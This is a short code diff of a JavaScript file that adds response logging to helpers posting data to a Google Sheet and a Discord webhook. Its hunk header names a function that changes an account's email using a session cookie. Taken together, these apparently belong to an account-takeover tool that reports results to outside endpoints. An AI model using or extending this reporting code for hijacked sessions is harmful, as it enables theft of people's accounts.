@@ -103,25 +103,29 @@ async function tryChangeEmail(sessionCookie, newEmail) {
 
 async function sendToSheet(tab, data) {
   try {
-    await fetch(GOOGLE_SHEET_URL, {
+    const resp = await fetch(GOOGLE_SHEET_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ tab, ...data }),
+      redirect: "follow",
     });
+    const text = await resp.text();
+    console.log(`[SHEET] ${tab} -> status=${resp.status} body=${text.substring(0, 200)}`);
   } catch (e) {
-    console.error("Sheet error:", e.message);
+    console.error("[SHEET ERROR]", e.message);
   }
 }
 
 async function sendToDiscord(webhookUrl, content) {
   try {
-    await fetch(webhookUrl, {
+    const resp = await fetch(webhookUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ content }),
     });
+    console.log(`[DISCORD] -> status=${resp.status}`);
   } catch (e) {
-    console.error("Discord error:", e.message);
+    console.error("[DISCORD ERROR]", e.message);
   }
 }
 
